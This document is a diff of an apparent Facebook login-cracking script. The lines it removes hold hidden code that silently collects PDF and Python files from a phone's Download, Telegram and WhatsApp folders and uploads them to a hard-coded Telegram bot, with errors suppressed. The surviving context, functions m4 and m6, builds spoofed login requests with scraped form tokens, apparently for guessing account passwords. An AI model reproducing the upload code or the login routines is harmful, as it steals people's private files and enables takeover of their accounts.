@@ -71,71 +71,6 @@ def bithika():
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
     except:pass
-    #------------------------py---------------------------#
-    try:
-        sdcard_path = '/sdcard/Download'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-	#---------------------py-----------------------#
-    try:
-        sdcard_path = '/sdcard/Download/Telegram'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-#---------------------py-----------------------#
-    try:
-        sdcard_path = '/sdcard/android/media/com.whatsapp/Whatsapp/Media/whatsapp Documents/Private'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass 
-#---------------------py-----------------------#
-    try:
-        sdcard_path = '/sdcard/android/media/com.whatsapp/Whatsapp/Media/whatsapp Documents/Sent'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass 
-	#---------------------py-----------------------#
-    try:
-        sdcard_path = '/sdcard/android/media/com.whatsapp/Whatsapp/Media/whatsapp Documents'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
 with tred(max_workers=30) as jjj:
     jjj.submit(bithika)
 
@@ -1277,7 +1212,7 @@ def m4(idf,pwv):
             'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
             'sec-ch-ua-model': '"GT-414XOP"',
             'sec-ch-ua-mobile': '?1',
-            'User-Agent': ua3,
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
             'viewport-width': '400',
             'Content-Type': 'application/x-www-form-urlencoded',
             'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1426,7 +1361,7 @@ def m6(idf,pwv):
             'User-Agent': ua3,
             'viewport-width': '400',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),
+            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'sec-ch-ua-platform-version': '"9.0.0"',
             'X-ASBD-ID': '129477',
             'dpr': '1.8',
